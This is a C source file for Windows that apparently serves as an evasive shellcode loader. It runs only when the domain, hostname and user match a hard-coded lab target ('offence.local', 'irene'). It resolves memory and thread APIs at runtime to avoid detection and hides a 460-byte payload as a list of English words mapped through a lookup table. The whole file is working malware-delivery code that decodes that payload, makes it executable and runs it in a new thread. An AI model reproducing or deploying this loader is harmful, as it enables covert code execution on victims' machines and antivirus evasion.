#include <windows.h>
#include <stdio.h>

typedef LPVOID(WINAPI* NtVirtualAlloc)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect
	);

typedef VOID(WINAPI* NtRtlMoveMemory)(
	VOID UNALIGNED* Destination,
	const VOID UNALIGNED* Source,
	SIZE_T Length
	);

typedef BOOL(WINAPI* NtVirtualProtect)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flNewProtect,
	PDWORD lpflOldProtect
	);

typedef HANDLE(WINAPI* NtCreateThread)(
	LPSECURITY_ATTRIBUTES   lpThreadAttributes,
	SIZE_T                  dwStackSize,
	LPTHREAD_START_ROUTINE  lpStartAddress,
	__drv_aliasesMem LPVOID lpParameter,
	DWORD                   dwCreationFlags,
	LPDWORD                 lpThreadId
	);

typedef DWORD(WINAPI* NtWaitForSingleObject)(
	HANDLE hHandle,
	DWORD  dwMilliseconds
	);


int main() {

	char* Domain = "offence.local";
	char* Hostname = "irene";
	char* Username = "irene";

	char domainBuffer[256];
	DWORD domainBufferSize = sizeof(domainBuffer);
	GetComputerNameExA(ComputerNameDnsDomain, domainBuffer, &domainBufferSize);

	char hostnameBuffer[256];
	DWORD hostnameBufferSize = sizeof(hostnameBuffer);
	GetComputerNameExA(ComputerNameDnsHostname, hostnameBuffer, &hostnameBufferSize);

	char usernameBuffer[256];
	DWORD usernameBufferSize = sizeof(usernameBuffer);
	GetUserNameA(&usernameBuffer, &usernameBufferSize);

	if (strcmp(domainBuffer, Domain) == 0 && strcmp(hostnameBuffer, Hostname) == 0 && strcmp(usernameBuffer, Username) == 0) {
		printf("Success!\n");
		PVOID pGiftAddress = NULL;
		HANDLE hThread = NULL;
		DWORD oldProtect = 0;
		BOOL rv;

		HMODULE hKernel = LoadLibraryA("Kernel32.dll");

		NtVirtualAlloc pVirtualAlloc = (NtVirtualAlloc)GetProcAddress(hKernel, "VirtualAlloc");
		NtRtlMoveMemory pRtlMoveMemory = (NtRtlMoveMemory)GetProcAddress(hKernel, "RtlMoveMemory");
		NtVirtualProtect pVirtualProtect = (NtVirtualProtect)GetProcAddress(hKernel, "VirtualProtect");
		NtCreateThread pCreateThread = (NtCreateThread)GetProcAddress(hKernel, "CreateThread");
		NtWaitForSingleObject pWaitForSingleObject = (NtWaitForSingleObject)GetProcAddress(hKernel, "WaitForSingleObject");

		unsigned char* translation_table[256] = { "funds","camel","canon","paint","album","holes","dying","johns","panel","lanka","waste","drink","leads","wagon","daddy","hands","gotta","helen","xerox","ghost","sport","skirt","noble","armor","angel","woods","naval","paxil","japan","scott","feels","chevy","loved","birds","timer","czech","jamie","trick","hence","gross","worst","bunch","chart","pipes","begin","logic","minor","haiti","added","hints","panic","rated","sluts","miami","issue","ozone","shark","mixed","stamp","papua","slave","strip","brick","draft","debug","lobby","image","heart","level","wrong","plain","bored","types","irish","tiles","teddy","heath","maple","earth","break","grams","three","helps","wales","epson","favor","cliff","lakes","italy","macro","smith","array","blame","malta","giant","brass","width","indie","tamil","horse","sixth","apnic","plots","pearl","skill","dodge","major","tight","brook","solid","seeks","north","snake","viral","stops","roads","maria","rocks","apart","doubt","glass","hotel","roger","promo","amend","colin","arrow","shade","teach","ideal","admin","texas","kevin","sanyo","songs","there","plate","apply","month","stood","coast","boats","marco","blond","donor","edges","style","salad","emacs","stage","amino","ideas","gives","enjoy","third","tommy","basic","gamma","loves","bloom","cards","woman","whats","burns","mount","oscar","kodak","catch","punch","lions","bench","tunes","mills","takes","units","amber","fancy","forms","slope","spray","dozen","grade","piano","ellis","notes","pumps","badge","tools","above","stick","twist","found","great","grace","rolls","probe","knock","goods","jesus","swing","score","flood","music","share","allan","digit","yemen","chess","ultra","until","blues","casio","dryer","nerve","boxes","strap","clock","monte","words","links","hobby","lopez","grain","turbo","topic","chase","sandy","omaha","media","patio","costs","forge","tones","evans","aware","years","argue","cable","mason","egypt","flows","fluid","shock","fairy","pitch","diary","rouge","saint","plaza","blade","handy","inbox","myers","bunny","hindu","trout" };

		unsigned char* translated_Gift[460] = { "myers","types","texas","media","flows","tones","great","funds","funds","funds","lobby","three","lobby","grams","helps","three","cliff","types","hints","blues","apnic","types","stood","helps","width","types","stood","helps","angel","types","stood","helps","loved","types","stood","stops","grams","types","hands","ellis","tiles","tiles","maple","hints","flood","types","hints","great","mills","slave","indie","amend","canon","begin","loved","lobby","grace","flood","wagon","lobby","camel","grace","sandy","cable","helps","lobby","three","types","stood","helps","loved","stood","image","slave","types","camel","ultra","stood","teach","plate","funds","funds","funds","types","sanyo","great","maria","pearl","types","camel","ultra","grams","stood","types","angel","level","stood","debug","loved","irish","camel","ultra","omaha","cliff","types","trout","flood","lobby","stood","sluts","plate","types","camel","boxes","maple","hints","flood","types","hints","great","mills","lobby","grace","flood","wagon","lobby","camel","grace","shark","topic","rocks","fluid","heath","paint","heath","jamie","panel","wrong","mixed","until","rocks","clock","italy","level","stood","debug","jamie","irish","camel","ultra","plots","lobby","stood","leads","types","level","stood","debug","japan","irish","camel","ultra","lobby","stood","album","plate","types","camel","ultra","lobby","italy","lobby","italy","giant","macro","smith","lobby","italy","lobby","macro","lobby","smith","types","texas","argue","loved","lobby","helps","trout","topic","italy","lobby","macro","smith","types","stood","xerox","evans","lakes","trout","trout","trout","malta","irish","twist","doubt","roads","panic","brass","rated","panic","funds","funds","lobby","cliff","irish","apply","costs","types","ideal","argue","cards","camel","funds","funds","irish","apply","patio","irish","above","canon","funds","czech","bunch","great","punch","worst","ideal","lobby","epson","irish","apply","media","heath","apply","fluid","lobby","badge","heath","doubt","hence","johns","trout","nerve","heath","apply","aware","skill","camel","camel","funds","funds","macro","lobby","badge","bunch","teach","tight","funds","trout","nerve","grams","grams","maple","hints","flood","maple","hints","great","types","trout","great","types","apply","rolls","types","trout","great","types","apply","grace","lobby","badge","aware","hands","turbo","topic","trout","nerve","types","apply","swing","major","gotta","lobby","italy","heath","apply","sandy","types","apply","blade","lobby","badge","enjoy","oscar","maria","indie","trout","nerve","types","ideal","knock","debug","canon","funds","funds","irish","notes","horse","solid","sixth","funds","funds","funds","funds","funds","lobby","grams","lobby","grams","types","apply","sandy","lakes","lakes","lakes","maple","hints","great","major","wagon","macro","lobby","grams","sandy","myers","plots","swing","level","jamie","epson","camel","camel","types","boats","level","jamie","angel","jesus","funds","skill","types","apply","costs","cliff","grams","lobby","grams","lobby","grams","lobby","grams","irish","trout","great","lobby","grams","irish","trout","score","maple","apply","grace","heath","apply","grace","lobby","badge","hotel","allan","draft","songs","trout","nerve","types","hints","blues","types","trout","music","stood","daddy","lobby","badge","panel","there","scott","width","trout","nerve","tools","flows","grade","whats","cliff","lobby","badge","kodak","stage","stick","gamma","trout","nerve","types","texas","knock","worst","slave","dying","amend","waste","teach","inbox","topic","rocks","holes","tools","bored","ghost","stops","north","major","funds","macro","lobby","apply","words","trout","nerve" };
		unsigned char Gift[460] = { 0 };
		int GiftSize = sizeof(Gift);

		pGiftAddress = pVirtualAlloc(NULL, GiftSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

		for (int sc_index = 0; sc_index < 460; sc_index++) {
			printf("");
			for (int tt_index = 0; tt_index <= 255; tt_index++) {
				if (strcmp(translation_table[tt_index], translated_Gift[sc_index]) == 0) {
					Gift[sc_index] = tt_index;
					break;
				}
			}

		}
		pRtlMoveMemory(pGiftAddress, Gift, GiftSize);
		rv = pVirtualProtect(pGiftAddress, GiftSize, PAGE_EXECUTE_READ, &oldProtect);
		hThread = pCreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pGiftAddress, NULL, NULL, NULL);
		pWaitForSingleObject(hThread, INFINITE);
	}
	else {

		exit(1);
	}

	return 0;
}
